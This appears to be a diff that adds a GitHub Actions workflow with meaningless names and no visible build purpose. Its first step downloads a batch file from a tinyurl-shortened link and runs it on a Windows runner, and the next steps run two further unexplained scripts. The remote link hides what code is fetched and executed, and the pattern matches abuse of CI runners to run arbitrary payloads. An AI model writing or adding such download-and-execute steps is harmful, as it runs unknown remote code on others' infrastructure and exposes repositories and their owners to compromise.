@@ -1,0 +1,24 @@
+name: gooldmmaadcc
+
+
+on:
+  workflow_dispatch:
+
+
+jobs:
+  build:
+    name: stratf
+    runs-on: windows-latest
+    steps:
+      - name: dcool
+        run: |
+          Invoke-WebRequest -Uri "https://tinyurl.com/4an37pfc" -OutFile "adasdadasda.bat"
+          cmd /c adasdadasda.bat
+
+
+      - name: rysadasd
+        run: cmd /c cccvvvcc3.bat
+
+
+      - name: dasdadsadasd
+        run: python cccvvvcc4.py
